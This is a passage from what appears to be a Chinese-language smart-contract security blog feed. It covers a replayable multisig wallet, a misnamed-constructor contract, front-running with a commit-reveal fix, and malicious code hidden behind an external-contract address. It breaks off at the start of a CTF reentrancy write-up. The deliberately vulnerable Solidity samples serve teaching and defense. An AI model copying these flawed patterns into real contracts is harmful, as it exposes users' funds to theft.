&quot;github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/cryptography/ECDSA.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract MultiSigWallet &#123;</span><br><span class="line">    using ECDSA for bytes32;</span><br><span class="line"></span><br><span class="line">    address[2] public owners;</span><br><span class="line">    mapping(bytes32 =&gt; bool) public executed;</span><br><span class="line"></span><br><span class="line">    constructor(address[2] memory _owners) payable &#123;</span><br><span class="line">        owners = _owners;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function transfer(</span><br><span class="line">        address _to,</span><br><span class="line">        uint _amount,</span><br><span class="line">        uint _nonce,</span><br><span class="line">        bytes[2] memory _sigs</span><br><span class="line">    ) external &#123;</span><br><span class="line">        bytes32 txHash = getTxHash(_to, _amount, _nonce);</span><br><span class="line">        require(!executed[txHash], &quot;tx executed&quot;);</span><br><span class="line">        require(_checkSigs(_sigs, txHash), &quot;invalid sig&quot;);</span><br><span class="line"></span><br><span class="line">        executed[txHash] = true;</span><br><span class="line"></span><br><span class="line">        (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getTxHash(</span><br><span class="line">        address _to,</span><br><span class="line">        uint _amount,</span><br><span class="line">        uint _nonce</span><br><span class="line">    ) public view returns (bytes32) &#123;</span><br><span class="line">        return keccak256(abi.encodePacked(address(this), _to, _amount, _nonce));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _checkSigs(</span><br><span class="line">        bytes[2] memory _sigs,</span><br><span class="line">        bytes32 _txHash</span><br><span class="line">    ) private view returns (bool) &#123;</span><br><span class="line">        bytes32 ethSignedHash = _txHash.toEthSignedMessageHash();</span><br><span class="line"></span><br><span class="line">        for (uint i = 0; i &lt; _sigs.length; i++) &#123;</span><br><span class="line">            address signer = ethSignedHash.recover(_sigs[i]);</span><br><span class="line">            bool valid = signer == owners[i];</span><br><span class="line"></span><br><span class="line">            if (!valid) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">// owners</span><br><span class="line">0xe19aea93F6C1dBef6A3776848bE099A7c3253ac8</span><br><span class="line">0xfa854FE5339843b3e9Bfd8554B38BD042A42e340</span><br><span class="line"></span><br><span class="line">// to</span><br><span class="line">0xe10422cc61030C8B3dBCD36c7e7e8EC3B527E0Ac</span><br><span class="line">// amount</span><br><span class="line">100</span><br><span class="line">// nonce</span><br><span class="line">0</span><br><span class="line">// tx hash</span><br><span class="line">0x12a095462ebfca27dc4d99feef885bfe58344fb6bb42c3c52a7c0d6836d11448</span><br><span class="line"></span><br><span class="line">// signatures</span><br><span class="line">0x120f8ed8f2fa55498f2ef0a22f26e39b9b51ed29cc93fe0ef3ed1756f58fad0c6eb5a1d6f3671f8d5163639fdc40bb8720de6d8f2523077ad6d1138a60923b801c</span><br><span class="line">0xa240a487de1eb5bb971e920cb0677a47ddc6421e38f7b048f8aa88266b2c884a10455a52dc76a203a1a9a953418469f9eec2c59e87201bbc8db0e4d9796935cb1b</span><br><span class="line">*/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>vulnerability contract 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">contract Missing&#123;</span><br><span class="line">    address private owner;</span><br><span class="line"></span><br><span class="line">    modifier onlyowner &#123;</span><br><span class="line">        require(msg.sender==owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function Constructor() // 改成constructor</span><br><span class="line">        public </span><br><span class="line">    &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () payable &#123;&#125; </span><br><span class="line"></span><br><span class="line">    function withdraw() </span><br><span class="line">        public </span><br><span class="line">        onlyowner</span><br><span class="line">    &#123;</span><br><span class="line">       owner.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 09.SWC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>23.抢先交易_1</title>
      <link href="/2023/07/15/00.security/23.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_1/"/>
      <url>/2023/07/15/00.security/23.%E6%8A%A2%E5%85%88%E4%BA%A4%E6%98%93_1/</url>
      
        <content type="html"><![CDATA[<h1 id="抢先交易-1"><a href="#抢先交易-1" class="headerlink" title="抢先交易_1"></a>抢先交易_1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>与大多数区块链一样，以太坊节点汇集交易并将它们形成块。只有在矿工解决了共识机制（目前是以太坊的 Ethash PoW）后，交易才被视为 有效。解决区块的矿工还选择将池中的哪些交易包含在区块中，通常按 gasPrice每笔交易的顺序排序。这是一个潜在的攻击可能。攻击者可以观察交易池中可能包含问题解决方案的交易，并修改或撤销解决者的权限。然后攻击者可以从该交易中获取数据并创建他们自己的更高gasPrice的交易，以便他们的交易包含在原始交易之前的一个块中。</p><p>Transactions take some time before they are mined. An attacker can watch the transaction pool and send a transaction, have it included in a block before the original transaction. This mechanism can be abused to re-order transactions to the attacker’s advantage.</p><h2 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h2><p>让我们通过一个简单的例子看看这是如何工作的。考虑FindThisHash.sol中显示的合同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Alice creates a guessing game.</span><br><span class="line">You win 10 ether if you can find the correct string that hashes to the target</span><br><span class="line">hash. Let&#x27;s see how this contract is vulnerable to front running.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">1. Alice deploys FindThisHash with 10 Ether.</span><br><span class="line">2. Bob finds the correct string that will hash to the target hash. (&quot;Ethereum&quot;)</span><br><span class="line">3. Bob calls solve(&quot;Ethereum&quot;) with gas price set to 15 gwei.</span><br><span class="line">4. Eve is watching the transaction pool for the answer to be submitted.</span><br><span class="line">5. Eve sees Bob&#x27;s answer and calls solve(&quot;Ethereum&quot;) with a higher gas price</span><br><span class="line">   than Bob (100 gwei).</span><br><span class="line">6. Eve&#x27;s transaction was mined before Bob&#x27;s transaction.</span><br><span class="line">   Eve won the reward of 10 ether.</span><br><span class="line"></span><br><span class="line">What happened?</span><br><span class="line">Transactions take some time before they are mined.</span><br><span class="line">Transactions not yet mined are put in the transaction pool.</span><br><span class="line">Transactions with higher gas price are typically mined first.</span><br><span class="line">An attacker can get the answer from the transaction pool, send a transaction</span><br><span class="line">with a higher gas price so that their transaction will be included in a block</span><br><span class="line">before the original.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">contract FindThisHash &#123;</span><br><span class="line">    bytes32 public constant hash =</span><br><span class="line">        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function solve(string memory solution) public &#123;</span><br><span class="line">        require(hash == keccak256(abi.encodePacked(solution)), &quot;Incorrect answer&quot;);</span><br><span class="line"></span><br><span class="line">        (bool sent, ) = msg.sender.call&#123;value: 10 ether&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设这份合约包含 1,000 个以太币。可以找到以下 SHA-3 哈希原像的用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2</span><br></pre></td></tr></table></figure><p>假设一位用户认为解决方案是<code>Ethereum</code>。他们调用<code>solve</code>并将 <code>Ethereum</code>作为参数。不幸的是，攻击者已经监视交易池中所有提交的解决方案。他们看到这个解决方案，检查其有效性，然后提交一个<code>gasPrice</code>比原始交易高得多的等价交易。因为更高<code>gasPrice</code>，矿工更加倾向于高gas的交易，从而打包。攻击者将拿走 1,000 个以太币，而解决问题的用户将一无所获。</p><p>请记住，在这种类型的“抢先交易”漏洞中，矿工激励自己进行攻击（或者可以被贿赂以收取高额费用来进行这些攻击）。不应低估攻击者本身就是矿工的可能性。</p><h2 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h2><p>ERC20标准有一个潜在的前端运行漏洞，这是由于该<code>approve</code>功能而产生的。<a href="http://bit.ly/2DbvQpJ">Mikhail Vladimirov 和 Dmitry Khovratovich</a>对此漏洞（以及缓解攻击的方法）进行了很好的见解</p><p>approve()：此功能允许用户允许其他用户代表他们转移代币</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function approve(address _spender, uint256 _value) returns (bool success)</span><br></pre></td></tr></table></figure><p>抢先漏洞发生在用户 Alice approve 她的朋友 Bob 花费 100 个代币的场景中。爱丽丝后来决定，她想撤销鲍勃对花费 100 个代币的批准，因此她创建了一个交易，将鲍勃的分配设置为 50 个代币。一直在仔细观察区块链打包池的 Bob 看到了这笔交易，并建立了自己花费 100 个代币的交易。他为自己的交易设定了比爱丽丝更高<code>gasPrice</code>的价格，因此他的交易优先于她的交易。因此，Bob转移了100个代币，然后Alice又再次approve了50个代币，这下就150个代币了</p><h2 id="预防技术"><a href="#预防技术" class="headerlink" title="预防技术"></a>预防技术</h2><p>有两类参与者可以执行此类抢先攻击：用户（修改<code>gasPrice</code>他们的交易）和矿工自己（他们可以按照他们认为合适的方式重新排序区块中的交易）。易受第一类（用户）攻击的合约比易受第二类（矿工）攻击的合约要差得多，因为矿工只能在解决区块时执行攻击，这对于任何针对特定区块的矿工来说都是不可能的. 在这里，我们将列出一些针对这两类攻击者的缓解措施。</p><p>一种方法是在 上设置上限<code>gasPrice</code>。这可以防止用户增加<code>gasPrice</code>并获得超过上限的优惠交易顺序。该措施仅防范第一类攻击者（任意用户）。在这种情况下，矿工仍然可以攻击合约，因为他们可以随心所欲地在他们的区块中订购交易，而不管 gas 价格如何。</p><p>一种更好的方法是使用 <a href="http://bit.ly/2CUh2KS">提交-显示</a> 方案。这种方案要求用户发送加密（通常是哈希）的交易。在交易被包含在一个块中之后，用户发送一个交易来揭示已发送的数据（揭示阶段）。这种方法可以防止矿工和用户进行抢先交易，因为他们无法确定交易的内容。This method, however, cannot conceal the transaction value (which in some cases is the valuable information that needs to be hidden). The <a href="https://ens.domains/">ENS</a> smart contract allowed users to send transactions whose committed data included the amount of ether they were willing to spend. Users could then send transactions of arbitrary value. During the reveal phase, users were refunded the difference between the amount sent in the transaction and the amount they were willing to spend.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">import &quot;github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.5/contracts/utils/Strings.sol&quot;;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">   Now Let&#x27;s see how to guard from front running using commit reveal scheme.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">1. Alice deploys SecuredFindThisHash with 10 Ether.</span><br><span class="line">2. Bob finds the correct string that will hash to the target hash. (&quot;Ethereum&quot;).</span><br><span class="line">3. Bob then finds the keccak256(Address in lowercase + Solution + Secret). </span><br><span class="line">   Address is his wallet address in lowercase, solution is &quot;Ethereum&quot;, Secret is like an password (&quot;mysecret&quot;) </span><br><span class="line">   that only Bob knows whic Bob uses to commit and reveal the solution.</span><br><span class="line">   keccak2566(&quot;0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266Ethereummysecret&quot;) = &#x27;0xf95b1dd61edc3bd962cdea3987c6f55bcb714a02a2c3eb73bd960d6b4387fc36&#x27;</span><br><span class="line">3. Bob then calls commitSolution(&quot;0xf95b1dd61edc3bd962cdea3987c6f55bcb714a02a2c3eb73bd960d6b4387fc36&quot;), </span><br><span class="line">   where he commits the calculated solution hash with gas price set to 15 gwei.</span><br><span class="line">4. Eve is watching the transaction pool for the answer to be submitted.</span><br><span class="line">5. Eve sees Bob&#x27;s answer and he also calls commitSolution(&quot;0xf95b1dd61edc3bd962cdea3987c6f55bcb714a02a2c3eb73bd960d6b4387fc36&quot;)</span><br><span class="line">   with a higher gas price than Bob (100 gwei).</span><br><span class="line">6. Eve&#x27;s transaction was mined before Bob&#x27;s transaction, but Eve has not got the reward yet.</span><br><span class="line">   He needs to call revealSolution() with exact secret and solution, so lets say he is watching the transaction pool</span><br><span class="line">   to front run Bob as he did previously</span><br><span class="line">7. Then Bob calls the revealSolution(&quot;Ethereum&quot;, &quot;mysecret&quot;) with gas price set to 15 gwei;</span><br><span class="line">8. Let&#x27;s consider that Eve&#x27;s who&#x27;s watching the transaction pool, find&#x27;s Bob&#x27;s reveal solution transaction and he also calls </span><br><span class="line">   revealSolution(&quot;Ethereum&quot;, &quot;mysecret&quot;) with higher gas price than Bob (100 gwei)</span><br><span class="line">9. Let&#x27;s consider that this time also Eve&#x27;s reveal transaction was mined before Bob&#x27;s transaction, but Eve will be</span><br><span class="line">   reverted with &quot;Hash doesn&#x27;t match&quot; error. Since the revealSolution() function checks the hash using </span><br><span class="line">   keccak256(msg.sender + solution + secret). So this time eve fails to win the reward.</span><br><span class="line">10.But Bob&#x27;s revealSolution(&quot;Ethereum&quot;, &quot;mysecret&quot;) passes the hash check and gets the reward of 10 ether.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">contract SecuredFindThisHash &#123;</span><br><span class="line">    // Struct is used to store the commit details</span><br><span class="line">    struct Commit &#123;</span><br><span class="line">        bytes32 solutionHash;</span><br><span class="line">        uint commitTime;</span><br><span class="line">        bool revealed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // The hash that is needed to be solved</span><br><span class="line">    bytes32 public hash =</span><br><span class="line">        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;</span><br><span class="line"></span><br><span class="line">    // Address of the winner</span><br><span class="line">    address public winner;</span><br><span class="line"></span><br><span class="line">    // Price to be rewarded</span><br><span class="line">    uint public reward;</span><br><span class="line"></span><br><span class="line">    // Status of game</span><br><span class="line">    bool public ended;</span><br><span class="line"></span><br><span class="line">    // Mapping to store the commit details with address</span><br><span class="line">    mapping(address =&gt; Commit) commits;</span><br><span class="line"></span><br><span class="line">    // Modifier to check if the game is active</span><br><span class="line">    modifier gameActive() &#123;</span><br><span class="line">        require(!ended, &quot;Already ended&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        reward = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* </span><br><span class="line">       Commit function to store the hash calculated using keccak256(address in lowercase + solution + secret). </span><br><span class="line">       Users can only commit once and if the game is active.</span><br><span class="line">    */</span><br><span class="line">    function commitSolution(bytes32 _solutionHash) public gameActive &#123;</span><br><span class="line">        Commit storage commit = commits[msg.sender];</span><br><span class="line">        require(commit.commitTime == 0, &quot;Already committed&quot;);</span><br><span class="line">        commit.solutionHash = _solutionHash;</span><br><span class="line">        commit.commitTime = block.timestamp;</span><br><span class="line">        commit.revealed = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* </span><br><span class="line">        Function to get the commit details. It returns a tuple of (solutionHash, commitTime, revealStatus);  </span><br><span class="line">        Users can get solution only if the game is active and they have committed a solutionHash</span><br><span class="line">    */</span><br><span class="line">    function getMySolution() public view gameActive returns (bytes32, uint, bool) &#123;</span><br><span class="line">        Commit storage commit = commits[msg.sender];</span><br><span class="line">        require(commit.commitTime != 0, &quot;Not committed yet&quot;);</span><br><span class="line">        return (commit.solutionHash, commit.commitTime, commit.revealed);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* </span><br><span class="line">        Function to reveal the commit and get the reward. </span><br><span class="line">        Users can get reveal solution only if the game is active and they have committed a solutionHash before this block and not revealed yet.</span><br><span class="line">        It generates an keccak256(msg.sender + solution + secret) and checks it with the previously commited hash.  </span><br><span class="line">        Front runners will not be able to pass this check since the msg.sender is different.</span><br><span class="line">        Then the actual solution is checked using keccak256(solution), if the solution matches, the winner is declared, </span><br><span class="line">        the game is ended and the reward amount is sent to the winner.</span><br><span class="line">    */</span><br><span class="line">    function revealSolution(</span><br><span class="line">        string memory _solution,</span><br><span class="line">        string memory _secret</span><br><span class="line">    ) public gameActive &#123;</span><br><span class="line">        Commit storage commit = commits[msg.sender];</span><br><span class="line">        require(commit.commitTime != 0, &quot;Not committed yet&quot;);</span><br><span class="line">        require(commit.commitTime &lt; block.timestamp, &quot;Cannot reveal in the same block&quot;);</span><br><span class="line">        require(!commit.revealed, &quot;Already commited and revealed&quot;);</span><br><span class="line"></span><br><span class="line">        bytes32 solutionHash = keccak256(</span><br><span class="line">            abi.encodePacked(Strings.toHexString(msg.sender), _solution, _secret)</span><br><span class="line">        );</span><br><span class="line">        require(solutionHash == commit.solutionHash, &quot;Hash doesn&#x27;t match&quot;);</span><br><span class="line"></span><br><span class="line">        require(keccak256(abi.encodePacked(_solution)) == hash, &quot;Incorrect answer&quot;);</span><br><span class="line"></span><br><span class="line">        winner = msg.sender;</span><br><span class="line">        ended = true;</span><br><span class="line"></span><br><span class="line">        (bool sent, ) = payable(msg.sender).call&#123;value: reward&#125;(&quot;&quot;);</span><br><span class="line">        if (!sent) &#123;</span><br><span class="line">            winner = address(0);</span><br><span class="line">            ended = false;</span><br><span class="line">            revert(&quot;Failed to send ether.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>43.Hiding Malicious Code with External Contract</title>
      <link href="/2023/07/15/00.security/43.Hiding%20Malicious%20Code%20with%20External%20Contract%20-%20l%CC%A7a%CC%A8a%CC%A8u%CC%84/"/>
      <url>/2023/07/15/00.security/43.Hiding%20Malicious%20Code%20with%20External%20Contract%20-%20l%CC%A7a%CC%A8a%CC%A8u%CC%84/</url>
      
        <content type="html"><![CDATA[<h1 id="Hiding-Malicious-Code-with-External-Contract"><a href="#Hiding-Malicious-Code-with-External-Contract" class="headerlink" title="Hiding Malicious Code with External Contract"></a>Hiding Malicious Code with External Contract</h1><p>In Solidity any address can be casted into specific contract, even if the contract at the address is not the one being casted.</p><p>This can be exploited to hide malicious code. Let’s see how.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.17;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">Let&#x27;s say Alice can see the code of Foo and Bar but not Mal.</span><br><span class="line">It is obvious to Alice that Foo.callBar() executes the code inside Bar.log().</span><br><span class="line">However Eve deploys Foo with the address of Mal, so that calling Foo.callBar()</span><br><span class="line">will actually execute the code at Mal.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">1. Eve deploys Mal</span><br><span class="line">2. Eve deploys Foo with the address of Mal</span><br><span class="line">3. Alice calls Foo.callBar() after reading the code and judging that it is</span><br><span class="line">   safe to call.</span><br><span class="line">4. Although Alice expected Bar.log() to be execute, Mal.log() was executed.</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">    Bar bar;</span><br><span class="line"></span><br><span class="line">    constructor(address _bar) &#123;</span><br><span class="line">        bar = Bar(_bar);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function callBar() public &#123;</span><br><span class="line">        bar.log();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bar &#123;</span><br><span class="line">    event Log(string message);</span><br><span class="line"></span><br><span class="line">    function log() public &#123;</span><br><span class="line">        emit Log(&quot;Bar was called&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This code is hidden in a separate file</span><br><span class="line">contract Mal &#123;</span><br><span class="line">    event Log(string message);</span><br><span class="line"></span><br><span class="line">    // function () external &#123;</span><br><span class="line">    //     emit Log(&quot;Mal was called&quot;);</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    // Actually we can execute the same exploit even if this function does</span><br><span class="line">    // not exist by using the fallback</span><br><span class="line">    function log() public &#123;</span><br><span class="line">        emit Log(&quot;Mal was called&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Remediation</p><ul><li>Initialize a new contract inside the constructor</li><li>Make the address of external contract <code>public</code> so that the code of the external contract can be reviewed</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Bar public bar;</span><br><span class="line"></span><br><span class="line">constructor() public &#123;</span><br><span class="line">    bar = new Bar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>17.reentrancy @h4ck</title>
      <link href="/2023/07/13/02.ChainflagCTF/17.reentrancy%20@h4ck/"/>
      <url>/2023/07/13/02.ChainflagCTF/17.reentrancy%20@h4ck/</url>
      
        <content type="html"><![CDATA[<h1 id="reentrancy-babybank"><a href="#reentrancy-babybank" class="headerlink" title="reentrancy @babybank"></a>reentrancy @babybank</h1><h2 id="contract"><a href="#contract" class="headerlink" title="contract"></a>contract</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 